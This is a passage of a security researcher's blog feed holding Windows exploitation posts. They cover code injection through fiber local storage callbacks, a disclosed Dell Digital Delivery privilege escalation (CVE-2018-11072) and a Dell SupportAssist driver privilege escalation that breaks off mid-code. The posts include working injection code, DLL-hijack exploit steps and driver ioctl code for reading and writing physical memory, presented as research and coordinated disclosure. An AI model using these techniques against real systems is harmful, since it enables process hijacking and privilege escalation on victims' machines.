creativity.</p>

<p>Similarly, processes have a specific subset of rights that are directly
exploitable:</p>

<p><code>
PROCESS_ALL_ACCESS
PROCESS_CREATE_PROCESS
PROCESS_CREATE_THREAD
PROCESS_DUP_HANDLE
PROCESS_VM_WRITE
</code></p>

<p>Barring these, more creativity is required.</p>

<h2>References</h2>

<p>[0]<a href="https://googleprojectzero.blogspot.com/2016/03/exploiting-leaked-thread-handle.html">https://googleprojectzero.blogspot.com/2016/03/exploiting-leaked-thread-handle.html</a> <br/>
[1]<a href="https://googleprojectzero.blogspot.com/2018/05/bypassing-mitigations-by-attacking-jit.html">https://googleprojectzero.blogspot.com/2018/05/bypassing-mitigations-by-attacking-jit.html</a> <br/>
[2]<a href="https://d4stiny.github.io/Local-Privilege-Escalation-on-most-Dell-computers/">https://d4stiny.github.io/Local-Privilege-Escalation-on-most-Dell-computers/</a> <br/>
[3]<a href="https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights">https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights</a> <br/>
[4]<a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext</a> <br/>
[5]<a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext</a> <br/>
[6]<a href="http://blog.txipinet.com/2007/04/05/69-a-paradox-writing-to-another-process-without-openning-it-nor-actually-writing-to-it/">http://blog.txipinet.com/2007/04/05/69-a-paradox-writing-to-another-process-without-openning-it-nor-actually-writing-to-it/</a> <br/>
[7]<a href="https://tyranidslair.blogspot.com/2017/08/the-art-of-becoming-trustedinstaller.html">https://tyranidslair.blogspot.com/2017/08/the-art-of-becoming-trustedinstaller.html</a> <br/>
[8]<a href="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FThread%2FNtImpersonateThread.html">https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FThread%2FNtImpersonateThread.html</a> <br/>
[9]<a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/master/NtApiDotNet/NtThreadNative.cs#L51">https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/master/NtApiDotNet/NtThreadNative.cs#L51</a> <br/>
[10]<a href="https://github.com/SafeBreach-Labs/pinjectra">https://github.com/SafeBreach-Labs/pinjectra</a> <br/>
[11]<a href="https://gist.github.com/hatRiot/aa77f007601be75684b95fe7ba978079">https://gist.github.com/hatRiot/aa77f007601be75684b95fe7ba978079</a> <br/>
[12]<a href="http://www.hexacorn.com/blog/category/code-injection/">http://www.hexacorn.com/blog/category/code-injection/</a> <br/>
[13]<a href="http://hatriot.github.io/blog/2019/08/12/code-execution-via-fiber-local-storage">http://hatriot.github.io/blog/2019/08/12/code-execution-via-fiber-local-storage</a> <br/>
[14]<a href="http://www.nynaeve.net/?p=180">http://www.nynaeve.net/?p=180</a> <br/>
[15]<a href="https://github.com/processhacker/processhacker/blob/master/phnt/include/ntpsapi.h#L98">https://github.com/processhacker/processhacker/blob/master/phnt/include/ntpsapi.h#L98</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Code Execution via Fiber Local Storage]]></title>
    <link href="http://hatRiot.github.io/blog/2019/08/12/code-execution-via-fiber-local-storage/"/>
    <updated>2019-08-12T14:10:04-07:00</updated>
    <id>http://hatRiot.github.io/blog/2019/08/12/code-execution-via-fiber-local-storage</id>
    <content type="html"><![CDATA[<p>While working on another research project (post to be released soon, will
update here), I stumbled onto a very Hexacorn[0] inspired type of code injection
technique that fit my situation perfectly. Instead of tainting the other post
with its description and code, I figured I&rsquo;d release a separate post describing
it here.</p>

<p>When I say that it&rsquo;s Hexacorn inspired, I mean that the bulk of the strategy is
similar to everything else you&rsquo;ve probably seen; we open a handle to the remote
process, allocate some memory, and copy our shellcode into it. At this point we
simply need to gain control over execution flow; this is where most of
Hexacorn&rsquo;s techniques come in handy. PROPagate via window properties,
WordWarping via rich edit controls, DnsQuery via code pointers, etc. Another
great example is Windows Notification Facility via user subscription callbacks
(at least in modexp&rsquo;s proof of concept), though this one isn&rsquo;t Hexacorns.</p>

<p>These strategies are also predicated on the process having certain capabilities
(DDE, private clipboards, WNF subscriptions), but more importantly, most, if
not all, do not work across sessions or integrity levels. This is obvious and
expected and frankly quite niche, but in my situation, a requirement.</p>

<h2>Fibers</h2>

<p>Fibers are &ldquo;a unit of execution that must be manually scheduled by the
application&rdquo;[1]. They are essentially register and stack states that can be
swapped in and out at will, and reflect upon the thread in which they are
executing. A single thread can be running at most a single fiber at a time, but
fibers can be hot swapped during execution and their quantum user controlled.</p>

<p>Fibers can also create and use fiber data. A pointer to this is stored in
<code>TEB-&gt;NtTib.FiberData</code> and is a per-thread structure. This is initially set
during a call to <code>ConvertThreadToFiber</code>. Taking a quick look at this:</p>

<p>```
void TestFiber()
{</p>

<pre><code>PVOID lpFiberData = HeapAlloc(GetProcessHeap(), 0, 0x10);
PVOID lpFirstFiber = NULL;
memset(lpFiberData, 0x41, 0x10);

lpFirstFiber = ConvertThreadToFiber(lpFiberData);
DebugBreak();
</code></pre>

<p>}</p>

<p>int main()
{</p>

<pre><code>DWORD tid = 0;
HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TestFiber, 0, 0, &amp;tid);
WaitForSingleObject(hThread, INFINITE);
return 0;
</code></pre>

<p>}
```</p>

<p>We need to spawn off the test in a new thread, as the main thread will
always have a fiber instantiated and the call will fail. If we
run this in a debugger we can inspect the data after the break:</p>

<p>```
0:000> ~
.  0  Id: 1674.1160 Suspend: 1 Teb: 7ffde000 Unfrozen</p>

<h1>1  Id: 1674.c78 Suspend: 1 Teb: 7ffdd000 Unfrozen</h1>

<p>0:000> dt <em>NT_TIB 7ffdd000 FiberData
ucrtbased!</em>NT_TIB
   +0x010 FiberData : 0x002ea9c0 Void
0:000> dd poi(0x002ea9c0) l5
002ea998  41414141 41414141 41414141 41414141
002ea9a8  abababab
```</p>

<p>In addition to fiber data, fibers also have access to the fiber local storage
(FLS). For all intents and purposes, this is identical to thread local storage
(TLS)[2]. This allows all thread fibers access to shared data via a global
index. The API for this is pretty simple, and very similar to TLS. In the
following sample, we&rsquo;ll allocate an index and toss some values in it. Using our
previous example as base:</p>

<p><code>
lpFirstFiber = ConvertThreadToFiber(lpFiberData);
dwIdx = FlsAlloc(NULL);
FlsSetValue(dwIdx, lpFiberData);
DebugBreak();
</code></p>

<p>A pointer to this data is stored in the thread&rsquo;s TEB, and can be extracted from
<code>TEB-&gt;FlsData</code>. From the above example, assume the returned FLS index for this
data is 6:</p>

<p><code>
0:001&gt; ~
   0  Id: 15f0.a10 Suspend: 1 Teb: 7ffdf000 Unfrozen
.  1  Id: 15f0.c30 Suspend: 1 Teb: 7ffde000 Unfrozen
0:001&gt; dt _TEB 7ffde000 FlsData
ntdll!_TEB
   +0xfb4 FlsData : 0x0049a008 Void
0:001&gt; dd poi(0x0049a008+(4*8))
0049a998  41414141 41414141 41414141 41414141
0049a9a8  abababab
</code></p>

<p>Note that the offset is always the index + 2.</p>

<h2>Abusing FLS Callbacks to Obtain Execution Control</h2>

<p>Let&rsquo;s return to that <code>FlsAlloc</code> call from the above example. Its first
parameter is a <code>PFLS_CALLBACK_FUNCTION</code>[3] and is used for, according to MSDN:</p>

<p><code>
An application-defined function. If the FLS slot is in use, FlsCallback is
called on fiber deletion, thread exit, and when an FLS index is freed. Specify
this function when calling the FlsAlloc function. The PFLS_CALLBACK_FUNCTION
type defines a pointer to this callback function.
</code></p>

<p>Well isn&rsquo;t that lovely. These callbacks are stored process wide in
<code>PEB-&gt;FlsCallback</code>. Let&rsquo;s try it out:</p>

<p><code>
dwIdx = FlsAlloc((PFLS_CALLBACK_FUNCTION)0x41414141);
</code></p>

<p>And fetching it (assuming again an index of 6):</p>

<p><code>
0:001&gt; dt _PEB 7ffd8000 FlsCallback
ucrtbased!_PEB
   +0x20c FlsCallback : 0x002d51f8 _FLS_CALLBACK_INFO
0:001&gt; dd 0x002d51f8 + (2 * 6 * 4) l1
002d5228  41414141
</code></p>

<p>What happens when we let this run to process exit?</p>

<p><code>
0:001&gt; g
(10a8.1328): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=41414141 ebx=7ffd8000 ecx=002da998 edx=002d522c esi=00000006 edi=002da028
eip=41414141 esp=0051f71c ebp=0051f734 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
41414141 ??              ???
</code></p>

<p>Recall the MSDN comment about <em>when</em> the FLS callback is invoked: <code>..on fiber
deletion, thread exit, and when an FLS index is freed</code>. This means that worst
case our code executes once the process exits and best case following a
threads exit or call to <code>FlsFree</code>. It&rsquo;s worth reiterating that the primary
thread for each process will have a fiber instantiated already; it&rsquo;s quite
possible that this thread isn&rsquo;t around anymore, but this doesn&rsquo;t matter as the
callbacks are at the process level.</p>

<p>Another salient point here is the first parameter to the callback function.
This parameter is the value of whatever was in the indexed slot and is also
stashed in ECX/RCX before invoking the callback:</p>

<p><code>
dwIdx = FlsAlloc((PFLS_CALLBACK_FUNCTION)0x41414141);
FlsSetValue(dwIdx, (PVOID)0x42424242);
DebugBreak();
</code></p>

<p>Which, when executed:</p>

<p><code>
(aa8.169c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=41414141 ebx=7ffd9000 ecx=42424242 edx=003c522c esi=00000006 edi=003ca028
eip=41414141 esp=006ef9c0 ebp=006ef9d8 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
41414141 ??              ???
</code></p>

<p>Under specific circumstances, this can be quite useful.</p>

<p>Anyway, PoC||GTFO, I&rsquo;ve included some code below. In it, we overwrite the
<code>msvcrt!_freefls</code> call used to free the FLS buffer.</p>

<p>```</p>

<h1>ifdef _WIN64</h1>

<h1>define FlsCallbackOffset 0x320</h1>

<h1>else</h1>

<h1>define FlsCallbackOffset 0x20c</h1>

<h1>endif</h1>

<p>void OverwriteFlsCallback(LPVOID dwNewAddr, HANDLE hProcess)
{</p>

<pre><code>_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll"), 
                                                        "NtQueryInformationProcess");
const char *payload = "\xcc\xcc\xcc\xcc";
PROCESS_BASIC_INFORMATION pbi;
SIZE_T sCallback = 0, sRetLen = 0;
LPVOID lpBuf = NULL;

//
// allocate memory and write in our payload as one would normally do
//

lpBuf = VirtualAllocEx(hProcess, NULL, sizeof(SIZE_T), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, lpBuf, payload, sizeof(SIZE_T), NULL);

// now we need to fetch the remote process PEB
NtQueryInformationProcess(hProcess, PROCESSINFOCLASS(0), &amp;pbi,
                          sizeof(PROCESS_BASIC_INFORMATION), NULL);

// read the FlsCallback address out of it
ReadProcessMemory(hProcess, (LPVOID)(((SIZE_T)pbi.PebBaseAddress) + FlsCallbackOffset), 
                      (LPVOID)&amp;sCallback, sizeof(SIZE_T), &amp;sRetLen);
sCallback += 2 * sizeof(SIZE_T);

// we're targeting the _freefls call, so overwrite that with our payload
// address 
WriteProcessMemory(hProcess, (LPVOID)sCallback, &amp;dwNewAddr, sizeof(SIZE_T), &amp;sRetLen);
</code></pre>

<p>}
```</p>

<p>I tested this on an updated Windows 10 x64 against notepad and mspaint; on
process exit, the callback is executed and we gain control over execution flow.
Pretty useful in the end; more on this soon&hellip;</p>

<h2>References</h2>

<p>[0] <a href="http://www.hexacorn.com">http://www.hexacorn.com</a> <br/>
[1] <a href="https://docs.microsoft.com/en-us/windows/win32/procthread/fibers">https://docs.microsoft.com/en-us/windows/win32/procthread/fibers</a> <br/>
[2] <a href="https://docs.microsoft.com/en-us/windows/win32/procthread/thread-local-storage">https://docs.microsoft.com/en-us/windows/win32/procthread/thread-local-storage</a> <br/>
[3] <a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/nc-winnt-pfls_callback_function">https://docs.microsoft.com/en-us/windows/win32/api/winnt/nc-winnt-pfls_callback_function</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Dell Digital Delivery - CVE-2018-11072 - Local Privilege Escalation]]></title>
    <link href="http://hatRiot.github.io/blog/2018/08/22/dell-digital-delivery-eop/"/>
    <updated>2018-08-22T14:10:04-07:00</updated>
    <id>http://hatRiot.github.io/blog/2018/08/22/dell-digital-delivery-eop</id>
    <content type="html"><![CDATA[<p>Back in March or April I began reversing a slew of Dell applications installed
on a laptop I had. Many of them had privileged services or processes running
and seemed to perform a lot of different complex actions. I previously
disclosed a LPE in SupportAssist[0], and identified another in their Digital
Delivery platform. This post will detail a Digital Delivery vulnerability and
how it can be exploited. This was privately discovered and disclosed, and no
known active exploits are in the wild. Dell has issued a security advisory for
this issue, which can be found here[4].</p>

<p>I&rsquo;ll have another follow-up post detailing the internals of this application
and a few others to provide any future researchers with a starting point.
Both applications are rather complex and expose a large attack surface.
If you&rsquo;re interested in bug hunting LPEs in large C#/C++ applications, it&rsquo;s
a fine place to begin.</p>

<p>Dell&rsquo;s Digital Delivery[1] is a platform for buying and installing system
software. It allows users to purchase or manage software packages and reinstall
them as necessary. Once again, it comes &ldquo;..preinstalled on most Dell
systems.&rdquo;[1]</p>

<h2>Bug</h2>

<p>The Digital Delivery service runs as SYSTEM under the name DeliveryService,
which runs the DeliveryService.exe binary. A userland binary, DeliveryTray.exe,
is the user-facing component that allows users to view installed applications
or reinstall previously purchased ones.</p>

<p>Communication from DeliveryTray to DeliveryService is performed via a
Windows Communication Foundation (WCF) named pipe. If you&rsquo;re unfamiliar with
WCF, it&rsquo;s essentially a standard methodology for exchanging data between two
endpoints[2]. It allows a service to register a processing endpoint and expose
functionality, similar to a web server with a REST API.</p>

<p>For those following along at home, you can find the initialization of the WCF
pipe in <code>Dell.ClientFulfillmentService.Controller.Initialize</code>:</p>

<p>```
this._host = WcfServiceUtil.StandupServiceHost(typeof(UiWcfSession),</p>

<pre><code>                            typeof(IClientFulfillmentPipeService),
                            "DDDService");
</code></pre>

<p>```</p>

<p>This invokes <code>Dell.NamedPipe.StandupServiceHost</code>:</p>

<p>```
ServiceHost host = null;
string apiUrl = &ldquo;net.pipe://localhost/DDDService/IClientFulfillmentPipeService&rdquo;;
Uri realUri = new Uri(&ldquo;net.pipe://localhost/&rdquo; + Guid.NewGuid().ToString());
Tryblock.Run(delegate
{
  host = new ServiceHost(classType, new Uri[]
  {</p>

<pre><code>realUri
</code></pre>

<p>  });
  host.AddServiceEndpoint(interfaceType, WcfServiceUtil.CreateDefaultBinding(), string.Empty);
  host.Open();
}, null, null);
AuthenticationManager.Singleton.RegisterEndpoint(apiUrl, realUri.AbsoluteUri);
```</p>

<p>The endpoint is thus registered and listening and the AuthenticationManager
singleton is responsible for handling requests. Once a request comes in, the
AuthenticationManager passes this off to the AuthPipeWorker function which,
among other things, performs the following authentication:</p>

<p>```
string execuableByProcessId = AuthenticationManager.GetExecuableByProcessId(processId);
bool flag2 = !FileUtils.IsSignedByDell(execuableByProcessId);
if (!flag2)
{</p>

<pre><code>...
</code></pre>

<p>```</p>

<p>If the process on the other end of the request is backed by a signed Dell
binary, the request is allowed and a connection may be established. If not, the
request is denied.</p>

<p>I noticed that this is new behavior, added sometime between 3.1 (my original
testing) and 3.5 (latest version at the time, 3.5.1001.0), so I assume Dell is
aware of this as a potential attack vector. Unfortunately, this is an
inadequate mitigation to sufficiently protect the endpoint. I was able to get
around this by simply spawning an executable signed by Dell (DeliveryTray.exe,
for example) and injecting code into it. Once code is injected, the WCF API
exposed by the privileged service is accessible.</p>

<p>The endpoint service itself is implemented by <code>Dell.NamedPipe</code>, and exposes a
dozen or so different functions. Those include:</p>

<p><code>
ArchiveAndResetSettings
EnableEntitlements
EnableEntitlementsAsync
GetAppSetting
PingTrayApp
PollEntitlementService
RebootMachine
ReInstallEntitlement
ResumeAllOperations
SetAppSetting
SetAppState
SetEntitlementList
SetUserDownloadChoice
SetWallpaper
ShowBalloonTip
ShutDownApp
UpdateEntitlementUiState
</code></p>

<p>Digital Delivery calls application install packages &ldquo;entitlements&rdquo;, so the
references to installation/reinstallation are specific to those packages either
available or presently installed.</p>

<p>One of the first functions I investigated was <code>ReInstallEntitlement</code>, which
allows one to initiate a reinstallation process of an installed entitlement.
This code performs the following:</p>

<p>```
private static void ReInstallEntitlementThreadStart(object reInstallArgs)
{</p>

<pre><code>PipeServiceClient.ReInstallArgs ra = (PipeServiceClient.ReInstallArgs)reInstallArgs;
PipeServiceClient.TryWcfCall(delegate
{
    PipeServiceClient._commChannel.ReInstall(ra.EntitlementId, ra.RunAsUser);
}, string.Concat(new object[]
{
    "ReInstall ",
    ra.EntitlementId,
    " ",
    ra.RunAsUser.ToString()
}));
</code></pre>

<p>}</p>

<p>```</p>

<p>This builds the arguments from the request and invokes a WCF call, which is
sent to the WCF endpoint. The <code>ReInstallEntitlement</code> call takes two arguments:
an entitlement ID and a RunAsUser flag. These are both controlled by the
caller.</p>

<p>On the server side, <code>Dell.ClientFulfillmentService.Controller</code> handles
implementation of these functions, and  <code>OnReInstall</code> handles the entitlement
reinstallation process. It does a couple sanity checks, validates the package
signature, and hits the <code>InstallationManager</code> to queue the install request. The
<code>InstallationManager</code> has a job queue and background thread (<code>WorkingThread</code>)
that occasionally polls for new jobs and, when it receives the install job,
kicks off <code>InstallSoftware</code>.</p>

<p>Because we&rsquo;re reinstalling an entitlement, the package is cached to disk and
ready to be installed. I&rsquo;m going to gloss over a few installation steps
here because it&rsquo;s frankly standard and menial.</p>

<p>The installation packages are located in
<code>C:\ProgramData\Dell\DigitalDelivery\Downloads\Software\</code> and are first
unzipped, followed by an installation of the software. In my case, I was
triggering the installation of <code>Dell Data Protection - Security Tools v1.9.1</code>,
and if you follow along in procmon, you&rsquo;ll see it startup an install process:</p>

<p><code>
"C:\ProgramData\Dell\Digital Delivery\Downloads\Software\Dell Data Protection _
Security Tools v1.9.1\STSetup.exe" -y -gm2 /S /z"\"CIRRUS_INSTALL,
SUPPRESSREBOOT=1\""
</code></p>

<p>The run user for this process is determined by the controllable RunAsUser flag
and, if set to False, runs as <code>SYSTEM</code> out of the <code>%ProgramData%</code> directory.</p>

<p>During process launch of the <code>STSetup</code> process, I noticed the following in
procmon:</p>

<p><code>
C:\ProgramData\Dell\Digital Delivery\Downloads\Software\Dell Data Protection _ Security Tools v1.9.1\VERSION.dll
C:\ProgramData\Dell\Digital Delivery\Downloads\Software\Dell Data Protection _ Security Tools v1.9.1\UxTheme.dll
C:\ProgramData\Dell\Digital Delivery\Downloads\Software\Dell Data Protection _ Security Tools v1.9.1\PROPSYS.dll
C:\ProgramData\Dell\Digital Delivery\Downloads\Software\Dell Data Protection _ Security Tools v1.9.1\apphelp.dll
C:\ProgramData\Dell\Digital Delivery\Downloads\Software\Dell Data Protection _ Security Tools v1.9.1\Secur32.dll
C:\ProgramData\Dell\Digital Delivery\Downloads\Software\Dell Data Protection _ Security Tools v1.9.1\api-ms-win-downlevel-advapi32-l2-1-0.dll
</code></p>

<p>Of interest here is that the parent directory, <code>%ProgramData%\Dell\Digital
Delivery\Downloads\Software</code> is not writable by any system user, but the
entitlement package folders, <code>Dell Data Protection - Security Tools</code> in this
case, is.</p>

<p>This allows non-privileged users to drop arbitrary files into this
directory, granting us a DLL hijacking opportunity.</p>

<h2>Exploitation</h2>

<p>Exploiting this requires several steps:</p>

<ol>
<li>Drop a DLL under the appropriate <code>%ProgramData%</code> software package directory</li>
<li>Launch a new process running an executable signed by Dell</li>
<li>Inject C# into this process (which is running unprivileged in userland)</li>
<li>Connect to the WCF named pipe from within the injected process</li>
<li>Trigger ReInstallEntitlement</li>
</ol>


<p>Steps 4 and 5 can be performed using the following:</p>

<p>```
PipeServiceClient client = new PipeServiceClient();
client.Initialize();</p>

<p>while (PipeServiceClient.AppState == AppState.Initializing)
  System.Threading.Thread.Sleep(1000);</p>

<p>EntitlementUiWrapper entitle = PipeServiceClient.EntitlementList[0];
PipeServiceClient.ReInstallEntitlement(entitle.ID, false);
System.Threading.Thread.Sleep(30000);</p>

<p>PipeServiceClient.CloseConnection();
```</p>

<p>The classes used above are imported from <code>NamedPipe.dll</code>. Note that we&rsquo;re
simply choosing the first entitlement available and reinstalling it. You may
need to iterate over entitlements to identify the correct package pointing to
where you dropped your DLL.</p>

<p>I&rsquo;ve provided a PoC on my Github here[3], and Dell has additionally released
a security advisory, which can be found here[4].</p>

<h2>Timeline</h2>

<p>05/24/18 &ndash; Vulnerability initially reported<br/>
05/30/18 &ndash; Dell requests further information<br/>
06/26/18 &ndash; Dell provides update on review and remediation<br/>
07/06/18 &ndash; Dell provides internal tracking ID and update on progress<br/>
07/24/18 &ndash; Update request<br/>
07/30/18 &ndash; Dell confirms they will issue a security advisory and associated CVE<br/>
08/07/18 &ndash; 90 day disclosure reminder provided<br/>
08/10/18 &ndash; Dell confirms 8/22 disclosure date alignment<br/>
08/22/18 &ndash; Public disclosure</p>

<h2>References</h2>

<p>[0] <a href="http://hatriot.github.io/blog/2018/05/17/dell-supportassist-local-privilege-escalation/">http://hatriot.github.io/blog/2018/05/17/dell-supportassist-local-privilege-escalation/</a><br/>
[1] <a href="https://www.dell.com/learn/us/en/04/flatcontentg/dell-digital-delivery">https://www.dell.com/learn/us/en/04/flatcontentg/dell-digital-delivery</a><br/>
[2] <a href="https://docs.microsoft.com/en-us/dotnet/framework/wcf/whats-wcf">https://docs.microsoft.com/en-us/dotnet/framework/wcf/whats-wcf</a><br/>
[3] <a href="https://github.com/hatRiot/bugs">https://github.com/hatRiot/bugs</a><br/>
[4] <a href="https://www.dell.com/support/article/us/en/04/SLN313559">https://www.dell.com/support/article/us/en/04/SLN313559</a><br/></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Dell SupportAssist Driver - Local Privilege Escalation]]></title>
    <link href="http://hatRiot.github.io/blog/2018/05/17/dell-supportassist-local-privilege-escalation/"/>
    <updated>2018-05-17T21:00:00-07:00</updated>
    <id>http://hatRiot.github.io/blog/2018/05/17/dell-supportassist-local-privilege-escalation</id>
    <content type="html"><![CDATA[<p>This post details a local privilege escalation (LPE) vulnerability I found
in Dell&rsquo;s SupportAssist[0] tool. The bug is in a kernel driver loaded by
the tool, and is pretty similar to bugs found by ReWolf in
ntiolib.sys/winio.sys[1], and those found by others in ASMMAP/ASMMAP64[2].
These bugs are pretty interesting because they can be used to bypass driver
signature enforcement (DSE) ad infinitum, or at least until they&rsquo;re no longer
compatible with newer operating systems.</p>

<p>Dell&rsquo;s SupportAssist is, according to the site, &ldquo;(..) now preinstalled on most
of all new Dell devices running Windows operating system (..)&rdquo;. It&rsquo;s primary
purpose is to troubleshoot issues and provide support capabilities both to the
user and to Dell. There&rsquo;s quite a lot of functionality in this software itself,
which I spent quite a bit of time reversing and may blog about at a later date.</p>

<h2>Bug</h2>

<p>Calling this a &ldquo;bug&rdquo; is really a misnomer; the driver exposes this
functionality eagerly. It actually exposes a lot of functionality, much like
some of the previously mentioned drivers. It provides capabilities for reading
and writing the model-specific register (MSR), resetting the 1394 bus, and
reading/writing CMOS.</p>

<p>The driver is first loaded when the SupportAssist tool is launched, and the
filename is <code>pcdsrvc_x64.pkms</code> on x64 and <code>pcdsrvc.pkms</code> on x86. Incidentally,
this driver isn&rsquo;t actually even built by Dell, but rather another company,
PC-Doctor[3]. This company provides &ldquo;system health solutions&rdquo; to a variety of
companies, including Dell, Intel, Yokogawa, IBM, and others. Therefore, it&rsquo;s
highly likely that this driver can be found in a variety of other products&hellip;</p>

<p>Once the driver is loaded, it exposes a symlink to the device at
<code>PCDSRVC{3B54B31B-D06B6431-06020200}_0</code> which is writable by unprivileged users
on the system. This allows us to trigger one of the many IOCTLs exposed by the
driver; approximately 30. I found a DLL used by the userland agent that served
as an interface to the kernel driver and conveniently had symbol names
available, allowing me to extract the following:</p>

<p><code>
// 0x222004 = driver activation ioctl
// 0x222314 = IoDriver::writePortData
// 0x22230c = IoDriver::writePortData
// 0x222304 = IoDriver::writePortData
// 0x222300 = IoDriver::readPortData
// 0x222308 = IoDriver::readPortData
// 0x222310 = IoDriver::readPortData
// 0x222700 = EcDriver::readData
// 0x222704 = EcDriver::writeData
// 0x222080 = MemDriver::getPhysicalAddress
// 0x222084 = MemDriver::readPhysicalMemory
// 0x222088 = MemDriver::writePhysicalMemory
// 0x222180 = Msr::readMsr
// 0x222184 = Msr::writeMsr
// 0x222104 = PciDriver::readConfigSpace
// 0x222108 = PciDriver::writeConfigSpace
// 0x222110 = PciDriver::?
// 0x22210c = PciDriver::?
// 0x222380 = Port1394::doesControllerExist
// 0x222384 = Port1394::getControllerConfigRom
// 0x22238c = Port1394::getGenerationCount
// 0x222388 = Port1394::forceBusReset
// 0x222680 = SmbusDriver::genericRead
// 0x222318 = SystemDriver::readCmos8
// 0x22231c = SystemDriver::writeCmos8
// 0x222600 = SystemDriver::getDevicePdo
// 0x222604 = SystemDriver::getIntelFreqClockCounts
// 0x222608 = SystemDriver::getAcpiThermalZoneInfo
</code></p>

<p>Immediately the MemDriver class jumps out. After some reversing, it appeared
that these functions do exactly as expected: allow userland services to both
read and write arbitrary physical addresses. There are a few quirks, however.</p>

<p>To start, the driver must first be &ldquo;unlocked&rdquo; in order for it to begin
processing control codes. It&rsquo;s unclear to me if this is some sort of hacky
event trigger or whether the kernel developers truly believed this would
inhibit malicious access. Either way, it&rsquo;s goofy. To unlock the driver, a
simple ioctl with the proper code must be sent. Once received, the driver will
process control codes for the lifetime of the system.</p>

<p>To unlock the driver, we just execute the following:</p>

<p>```
BOOL bResult;
DWORD dwRet;
SIZE_T code = 0xA1B2C3D4, outBuf;</p>

<p>bResult = DeviceIoControl(hDriver, 0x222004,</p>

<pre><code>                      &amp;code, sizeof(SIZE_T), 
                      &amp;outBuf, sizeof(SIZE_T), 
                      &amp;dwRet, NULL);
</code></pre>

<p>```</p>

<p>Once the driver receives this control code and validates the received code
(0xA1B2C3D4), it sets a global flag and begins accepting all other control
codes.</p>

<h2>Exploitation</h2>

<p>From here, we could exploit this the same way rewolf did [4]: read out physical
memory looking for process pool tags, then traverse these until we identify our
process as well as a SYSTEM process, then steal the token. However, PCD
appears to give us a shortcut via <code>getPhysicalAddress</code> ioctl. If this does
indeed return the physical address of a given virtual address (VA), we can simply
find the physical of our VA and enable a couple token privileges[5] using the
<code>writePhysicalMemory</code> ioctl.</p>

<p>Here&rsquo;s how the <code>getPhysicalAddress</code> function works:</p>

<p><code>
v5 = IoAllocateMdl(**(PVOID **)(a1 + 0x18), 1u, 0, 0, 0i64);
v6 = v5;
if ( !v5 )
  return 0xC0000001i64;
MmProbeAndLockPages(v5, 1, 0);
**(_QWORD **)(v3 + 0x18) = v4 &amp; 0xFFF | ((_QWORD)v6[1].Next &lt;&lt; 0xC);
MmUnlockPages(v6);
IoFreeMdl(v6);
</code></p>

<p>Keen observers will spot the problem here; the <code>MmProbeAndLockPages</code> call is
passing in UserMode for the KPROCESSOR_MODE, meaning we won&rsquo;t be able to
resolve any kernel mode VAs, only usermode addresses.</p>

<p>We can still read chunks of physical memory unabated, however, as the
<code>readPhysicalMemory</code> function is quite simple:</p>

<p><code>
if ( !DoWrite )
{
  memmove(a1, a2, a3);
  return 1;
}
</code></p>

<p>They reuse a single function for reading and writing physical memory; we&rsquo;ll
return to that. I decided to take a different approach than rewolf for a number
of reasons with great results.</p>

<p>Instead, I wanted to toggle on SeDebugPrivilege for my current process token.
This would require finding the token in memory and writing a few bytes at a
field offset. To do this, I used <code>readPhysicalMemory</code> to read chunks of memory
of size 0x10000000 and checked for the first field in a _TOKEN, TokenSource. In
a user token, this will be the string <code>User32</code>. Once we&rsquo;ve identified this,
we double check that we&rsquo;ve found a token by validating the TokenLuid, which we
can obtain from userland using the GetTokenInformation API.</p>

<p>In order to speed up the memory search, I only iterate over the addresses that
match the token&rsquo;s virtual address byte index. Essentially, when you convert a
virtual address to a physical address (PA) the byte index, or the lower 12 bits,
do not change. To demonstrate, assume we have a VA of 0xfffff8a001cc2060.
Translating this to a physical address then:</p>

<p>```
kd> !pte  fffff8a001cc2060</p>

<pre><code>                                       VA fffff8a001cc2060
</code></pre>

<p>PXE at FFFFF6FB7DBEDF88    PPE at FFFFF6FB7DBF1400    PDE at FFFFF6FB7E280070    PTE at FFFFF6FC5000E610
contains 000000007AC84863  contains 00000000030D4863  contains 0000000073147863  contains E6500000716FD963
pfn 7ac84     &mdash;-DA&mdash;KWEV  pfn 30d4      &mdash;-DA&mdash;KWEV  pfn 73147     &mdash;-DA&mdash;KWEV  pfn 716fd     -G-DA&mdash;KW-V</p>

<p>kd> ? 716fd * 0x1000 + 060
Evaluate expression: 1903153248 = 00000000`716fd060
```</p>

<p>So our physical address is 0x716fd060 (if you&rsquo;d like to read more about
converting VA to PA, check out this great Microsoft article[6]). Notice the
lower 12 bits remain the same between VA/PA. The search loop then boiled down
to the following code:</p>

<p>```
uStartAddr = uStartAddr + (VirtualAddress &amp; 0xfff);
for (USHORT chunk = 0; chunk &lt; 0xb; ++chunk) {</p>

<pre><code>lpMemBuf = ReadBlockMem(hDriver, uStartAddr, 0x10000000);
